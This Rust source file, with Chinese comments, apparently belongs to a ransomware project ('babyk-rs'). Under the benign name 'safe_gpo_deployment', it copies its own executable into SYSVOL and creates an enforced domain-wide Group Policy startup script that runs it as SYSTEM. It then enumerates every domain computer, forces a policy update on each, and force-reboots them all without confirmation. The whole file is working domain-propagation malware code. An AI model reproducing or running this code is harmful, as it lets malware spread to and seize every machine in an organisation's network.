use std::{
    fs::File,
    io::Write,
    path::PathBuf,
    time::{SystemTime, UNIX_EPOCH},
    process::Command,
    env,
    thread,
    sync::mpsc,
};

use std::result::Result;
use std::io;

#[derive(Debug)]
pub struct GPOError(pub String);

impl std::fmt::Display for GPOError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "GPO Error: {}", self.0)
    }
}

impl std::error::Error for GPOError {}

impl From<io::Error> for GPOError {
    fn from(err: io::Error) -> Self {
        GPOError(format!("IO error: {}", err))
    }
}

#[cfg(windows)]
use windows::{
    core::PWSTR,
    Win32::System::SystemInformation::{GetComputerNameExW, GetVersionExW, GetSystemInfo, OSVERSIONINFOW, SYSTEM_INFO, ComputerNameDnsDomain, ComputerNameDnsHostname},
};

#[derive(Clone, Copy, PartialEq, Debug)]
pub enum ImplementationMode {
    PowerShell,
    WindowsAPI,
}

#[derive(Debug)]
struct MachineInfo {
    hostname: String,
    ip_address: String,
    mac_address: String,
    domain: String,
    os_version: String,
    architecture: String,
    timestamp: u64,
    location: String,
    user: String,
}

pub fn safe_gpo_deployment_with_mode(mode: ImplementationMode) -> Result<(), GPOError> {
    let (sender, receiver) = mpsc::channel();
    
    let mode_clone = mode;
    thread::spawn(move || {
        let mut deployer = GPODeployer::new(mode_clone);
        let result = deployer.execute();
        let _ = sender.send(result);
    });
    
    receiver.recv().map_err(|e| GPOError(format!("Thread communication error: {}", e)))?
}

pub fn safe_gpo_deployment() -> Result<(), GPOError> {
    safe_gpo_deployment_with_mode(ImplementationMode::WindowsAPI)
}

struct GPODeployer {
    exe_name: String,
    service_name: String,
    task_name: String,
    target_path: PathBuf,
    data_path: PathBuf,
    gpo_name: String,
    domain_name: String,
    sysvol_path: PathBuf,
    current_exe_path: PathBuf,
    implementation_mode: ImplementationMode,
}

impl GPODeployer {
    fn new(mode: ImplementationMode) -> Self {
        let exe_name = format!("{}.exe", Self::generate_random_name(6));
        let gpo_name = format!("GPO_{}", Self::generate_random_name(8));
        let current_exe_path = env::current_exe().unwrap_or_else(|_| PathBuf::from("babyk-rs.exe"));
        
        Self {
            exe_name: exe_name.clone(),
            service_name: Self::generate_random_name(8),
            task_name: Self::generate_random_name(8),
            target_path: PathBuf::from("C:\\Windows\\System32\\"),
            data_path: PathBuf::from("C:\\Windows\\Temp\\"),
            gpo_name,
            domain_name: String::new(),
            sysvol_path: PathBuf::new(),
            current_exe_path,
            implementation_mode: mode,
        }
    }

    fn execute(&mut self) -> Result<(), GPOError> {
        println!("[*] 开始 GPO 自动部署流程...");
        println!("[*] 实现模式: {:?}", self.implementation_mode);
        
        // 收集机器信息
        println!("[*] 收集机器信息...");
        let machine_info = self.collect_machine_info()?;
        self.save_machine_info(&machine_info)?;
        
        // 获取当前程序路径
        println!("[*] 当前程序路径: {}", self.current_exe_path.display());
        
        // 获取域名并设置路径
        println!("[*] 获取域名信息...");
        self.domain_name = machine_info.domain.clone();
        let script_name = format!("{}.exe", Self::generate_random_name(8));
        self.sysvol_path = PathBuf::from(format!(
            "\\\\{}\\SYSVOL\\{}\\scripts\\{}",
            machine_info.hostname,
            machine_info.domain,
            script_name
        ));
        
        // 复制自身程序到 SYSVOL
        println!("[*] 复制自身程序到 SYSVOL...");
        self.copy_self_to_sysvol()?;
        
        // 创建新的 GPO
        println!("[*] 创建新的 GPO: {}", self.gpo_name);
        self.create_gpo()?;
        
        // 配置 GPO 启动脚本（以 SYSTEM 权限运行）
        println!("[*] 配置 GPO 启动脚本...");
        self.configure_gpo_startup_script(&script_name)?;
        
        // 链接 GPO 到域
        println!("[*] 链接 GPO 到域...");
        self.link_gpo_to_domain()?;
        
        // 获取域内所有计算机
        println!("[*] 获取域内所有计算机...");
        let domain_computers = self.get_domain_computers()?;
        println!("[+] 找到 {} 台域计算机", domain_computers.len());
        
        // 远程强制更新组策略
        println!("[*] 远程强制更新所有域计算机的组策略...");
        self.remote_force_gpupdate(&domain_computers)?;
        
        // 询问是否要远程重启所有计算机
        println!("\n[!] GPO 已部署并强制更新");
        println!("[!] 启动脚本将在计算机下次启动时以 SYSTEM 权限执行");
        println!("[!] 是否要远程重启所有域计算机？(y/n)");
        
        // 自动选择重启（为了自动化）
        println!("[*] 自动选择：远程重启所有域计算机");
        self.remote_restart_computers(&domain_computers)?;
        
        println!("[+] GPO 部署完成！自身程序将在所有域计算机启动时以 SYSTEM 权限执行");
        Ok(())
    }

    #[cfg(windows)]
    fn collect_machine_info(&self) -> Result<MachineInfo, GPOError> {
        unsafe {
            // 获取主机名 (使用windows crate)
            let mut hostname_buffer = [0u16; 256];
            let mut hostname_size = hostname_buffer.len() as u32;
            let mut hostname = String::new();
            if GetComputerNameExW(ComputerNameDnsHostname, PWSTR(hostname_buffer.as_mut_ptr()), &mut hostname_size).is_ok() {
                hostname = String::from_utf16_lossy(&hostname_buffer[..hostname_size as usize]);
            }

            // 获取IP地址（简化版本）
            let ip_address = self.get_simple_ip_address();
            
            // 获取MAC地址（简化版本）
            let mac_address = self.get_simple_mac_address();
            
            // 获取域名 (使用windows crate)
            let mut domain_buffer = [0u16; 256];
            let mut domain_size = domain_buffer.len() as u32;
            let mut domain = String::new();
            if GetComputerNameExW(ComputerNameDnsDomain, PWSTR(domain_buffer.as_mut_ptr()), &mut domain_size).is_ok() {
                domain = String::from_utf16_lossy(&domain_buffer[..domain_size as usize]);
            }

            // 获取操作系统版本 (使用windows crate)
            let mut os_version = String::new();
            let mut os_info = OSVERSIONINFOW {
                dwOSVersionInfoSize: std::mem::size_of::<OSVERSIONINFOW>() as u32,
                ..Default::default()
            };
            if GetVersionExW(&mut os_info).is_ok() {
                os_version = format!("{}.{}.{}", os_info.dwMajorVersion, os_info.dwMinorVersion, os_info.dwBuildNumber);
            }

            // 获取系统架构 (使用windows crate)
            let mut sys_info = SYSTEM_INFO::default();
            GetSystemInfo(&mut sys_info);
            let architecture = "Unknown".to_string(); // 简化架构检测

            // 获取用户名 (简化版本，不使用Windows API)
            let user = whoami::username();

            // 获取时间戳
            let timestamp = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_secs();

            // 简化地理位置
            let location = "Unknown".to_string();

            Ok(MachineInfo {
                hostname,
                ip_address,
                mac_address,
                domain,
                os_version,
                architecture,
                timestamp,
                location,
                user,
            })
        }
    }

    #[cfg(not(windows))]
    fn collect_machine_info(&self) -> Result<MachineInfo, GPOError> {
        let hostname = whoami::hostname();
        let ip_address = self.get_simple_ip_address();
        let mac_address = self.get_simple_mac_address();
        let domain = String::new();
        let os_version = "Unknown".to_string();
        let architecture = "Unknown".to_string();
        let user = whoami::username();
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();
        let location = "Unknown".to_string();

        Ok(MachineInfo {
            hostname,
            ip_address,
            mac_address,
            domain,
            os_version,
            architecture,
            timestamp,
            location,
            user,
        })
    }

    fn get_simple_ip_address(&self) -> String {
        // 简化版本，返回本地回环地址
        "127.0.0.1".to_string()
    }

    fn get_simple_mac_address(&self) -> String {
        // 简化版本，返回默认MAC地址
        "00:00:00:00:00:00".to_string()
    }

    fn save_machine_info(&self, info: &MachineInfo) -> Result<(), GPOError> {
        let file_path = self.data_path.join("machine_info.txt");
        
        let mut file = File::create(file_path)?;
        writeln!(&mut file, "主机名: {}", info.hostname)?;
        writeln!(&mut file, "IP地址: {}", info.ip_address)?;
        writeln!(&mut file, "MAC地址: {}", info.mac_address)?;
        writeln!(&mut file, "域名: {}", info.domain)?;
        writeln!(&mut file, "操作系统版本: {}", info.os_version)?;
        writeln!(&mut file, "系统架构: {}", info.architecture)?;
        writeln!(&mut file, "时间戳: {}", info.timestamp)?;
        writeln!(&mut file, "位置: {}", info.location)?;
        writeln!(&mut file, "用户名: {}", info.user)?;
        
        Ok(())
    }

    fn copy_self_to_sysvol(&self) -> Result<(), GPOError> {
        // 创建 SYSVOL 目录
        if let Some(parent) = self.sysvol_path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        
        // 检查当前程序是否存在
        if !self.current_exe_path.exists() {
            return Err(GPOError(format!(
                "当前程序不存在: {}",
                self.current_exe_path.display()
            )));
        }
        
        // 复制自身程序到 SYSVOL
        std::fs::copy(&self.current_exe_path, &self.sysvol_path)?;
        
        println!("[+] 自身程序已复制到: {}", self.sysvol_path.display());
        Ok(())
    }

    fn create_gpo(&self) -> Result<(), GPOError> {
        // 使用 PowerShell 创建新的 GPO
        let ps_script = format!(
            "Import-Module GroupPolicy; New-GPO -Name '{}' -Comment 'Automated GPO deployment'",
            self.gpo_name
        );
        
        let output = Command::new("powershell")
            .args(&["-Command", &ps_script])
            .output()
            .map_err(|e| GPOError(format!("PowerShell 执行失败: {}", e)))?;
        
        if !output.status.success() {
            let error_msg = String::from_utf8_lossy(&output.stderr);
            return Err(GPOError(format!("创建 GPO 失败: {}", error_msg)));
        }
        
        println!("[+] GPO '{}' 创建成功", self.gpo_name);
        Ok(())
    }

    fn configure_gpo_startup_script(&self, script_name: &str) -> Result<(), GPOError> {
        // 使用 PowerShell 配置 GPO 启动脚本
        // 启动脚本以 SYSTEM 权限运行
        let ps_script = format!(
            r#"
            Import-Module GroupPolicy;
            $gpo = Get-GPO -Name '{}';
            $gpoPath = $gpo.Path;
            
            # 创建启动脚本目录
            $startupPath = Join-Path $gpoPath "Machine\Scripts\Startup";
            if (-not (Test-Path $startupPath)) {{
                New-Item -ItemType Directory -Path $startupPath -Force | Out-Null;
            }}
            
            # 复制自身程序到 GPO 启动脚本目录
            Copy-Item -Path '{}' -Destination (Join-Path $startupPath '{}') -Force;
            
            # 配置启动脚本
            Set-GPPrefRegistryValue -Name 'StartupScript' -Context Computer -Action Create -Key 'HKLM\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0' -ValueName 'Script' -Value '{}' -Type String;
            Set-GPPrefRegistryValue -Name 'StartupScript' -Context Computer -Action Create -Key 'HKLM\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0' -ValueName 'Parameters' -Value '' -Type String;
            
            # 使用 GPMC 配置启动脚本
            $iniContent = @"
[Startup]
0CmdLine={}
0Parameters=
"@
            $iniContent | Out-File -FilePath (Join-Path $gpoPath "Machine\Scripts\scripts.ini") -Encoding ASCII -Force;
            "#,
            self.gpo_name,
            self.sysvol_path.display(),
            script_name,
            script_name,
            script_name
        );
        
        let output = Command::new("powershell")
            .args(&["-Command", &ps_script])
            .output()
            .map_err(|e| GPOError(format!("PowerShell 执行失败: {}", e)))?;
        
        if !output.status.success() {
            let error_msg = String::from_utf8_lossy(&output.stderr);
            return Err(GPOError(format!("配置启动脚本失败: {}", error_msg)));
        }
        
        println!("[+] 启动脚本配置成功（将以 SYSTEM 权限运行）");
        Ok(())
    }

    fn link_gpo_to_domain(&self) -> Result<(), GPOError> {
        // 使用 PowerShell 链接 GPO 到域
        let ps_script = format!(
            "Import-Module GroupPolicy; New-GPLink -Name '{}' -Target '{}' -LinkEnabled Yes -Enforced Yes",
            self.gpo_name,
            if self.domain_name.is_empty() {
                "DC=domain,DC=local".to_string()
            } else {
                format!("DC={}", self.domain_name.replace(".", ",DC="))
            }
        );
        
        let output = Command::new("powershell")
            .args(&["-Command", &ps_script])
            .output()
            .map_err(|e| GPOError(format!("PowerShell 执行失败: {}", e)))?;
        
        if !output.status.success() {
            let error_msg = String::from_utf8_lossy(&output.stderr);
            return Err(GPOError(format!("链接 GPO 失败: {}", error_msg)));
        }
        
        println!("[+] GPO 已链接到域");
        Ok(())
    }

    fn force_gpupdate(&self) -> Result<(), GPOError> {
        // 强制更新组策略
        let output = Command::new("gpupdate")
            .args(&["/force"])
            .output()
            .map_err(|e| GPOError(format!("执行 gpupdate 失败: {}", e)))?;
        
        if !output.status.success() {
            let error_msg = String::from_utf8_lossy(&output.stderr);
            println!("[!] gpupdate 警告: {}", error_msg);
        } else {
            println!("[+] 组策略更新成功");
        }
        
        Ok(())
    }

    fn get_domain_computers(&self) -> Result<Vec<String>, GPOError> {
        // 使用 PowerShell 获取域内所有计算机
        let ps_script = "Import-Module ActiveDirectory; Get-ADComputer -Filter * | Select-Object -ExpandProperty Name";
        
        let output = Command::new("powershell")
            .args(&["-Command", ps_script])
            .output()
            .map_err(|e| GPOError(format!("PowerShell 执行失败: {}", e)))?;
        
        if !output.status.success() {
            let error_msg = String::from_utf8_lossy(&output.stderr);
            return Err(GPOError(format!("获取域计算机失败: {}", error_msg)));
        }
        
        let computers: Vec<String> = String::from_utf8_lossy(&output.stdout)
            .lines()
            .filter(|line| !line.trim().is_empty())
            .map(|line| line.trim().to_string())
            .collect();
        
        Ok(computers)
    }

    fn remote_force_gpupdate(&self, computers: &[String]) -> Result<(), GPOError> {
        let mut success_count = 0;
        let mut failed_count = 0;
        
        for computer in computers {
            println!("[*] 正在更新 {} 的组策略...", computer);
            
            let ps_script = format!(
                "Invoke-Command -ComputerName {} -ScriptBlock {{ gpupdate /force }} -ErrorAction SilentlyContinue",
                computer
            );
            
            let output = Command::new("powershell")
                .args(&["-Command", &ps_script])
                .output()
                .map_err(|e| GPOError(format!("PowerShell 执行失败: {}", e)))?;
            
            if output.status.success() {
                println!("[+] {} 组策略更新成功", computer);
                success_count += 1;
            } else {
                println!("[!] {} 组策略更新失败", computer);
                failed_count += 1;
            }
        }
        
        println!("[+] 组策略更新完成: 成功 {}, 失败 {}", success_count, failed_count);
        Ok(())
    }

    fn remote_restart_computers(&self, computers: &[String]) -> Result<(), GPOError> {
        let mut success_count = 0;
        let mut failed_count = 0;
        
        for computer in computers {
            println!("[*] 正在重启 {}...", computer);
            
            // 使用 shutdown 命令远程重启
            let output = Command::new("shutdown")
                .args(&["/r", "/m", computer, "/t", "0", "/f"])
                .output()
                .map_err(|e| GPOError(format!("执行 shutdown 命令失败: {}", e)))?;
            
            if output.status.success() {
                println!("[+] {} 重启命令已发送", computer);
                success_count += 1;
            } else {
                // 如果 shutdown 命令失败，尝试使用 PowerShell
                let ps_script = format!(
                    "Restart-Computer -ComputerName {} -Force -ErrorAction SilentlyContinue",
                    computer
                );
                
                let ps_output = Command::new("powershell")
                    .args(&["-Command", &ps_script])
                    .output()
                    .map_err(|e| GPOError(format!("PowerShell 执行失败: {}", e)))?;
                
                if ps_output.status.success() {
                    println!("[+] {} 重启命令已发送 (PowerShell)", computer);
                    success_count += 1;
                } else {
                    println!("[!] {} 重启失败", computer);
                    failed_count += 1;
                }
            }
        }
        
        println!("[+] 远程重启完成: 成功 {}, 失败 {}", success_count, failed_count);
        println!("[!] 所有计算机将在 60 秒内重启");
        Ok(())
    }

    fn generate_random_name(length: usize) -> String {
        const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        use std::time::{SystemTime, UNIX_EPOCH};
        
        let seed = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        
        (0..length)
            .map(|i| {
                let idx = ((seed + i as u128) % CHARSET.len() as u128) as usize;
                CHARSET[idx] as char
            })
            .collect()
    }
}
